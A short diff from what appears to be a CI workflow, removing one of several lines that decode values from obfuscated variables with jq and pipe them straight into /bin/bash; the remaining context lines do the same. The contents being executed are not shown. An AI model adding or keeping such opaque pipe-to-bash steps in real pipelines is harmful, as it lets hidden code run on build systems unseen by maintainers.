@@ -26,7 +26,6 @@ jobs:
           echo $m33 | jq -r .eh04019 | /bin/bash
           echo $nndq4 | jq -r .a9 | /bin/bash
           echo $h879 | jq -r .k02009 | /bin/bash
-          echo $hbtq13 | jq -r .tfq164 | /bin/bash
           printf '%s' "$aistk26895" | jq -r .xvts31267 | /bin/bash
 
       - name: Save output
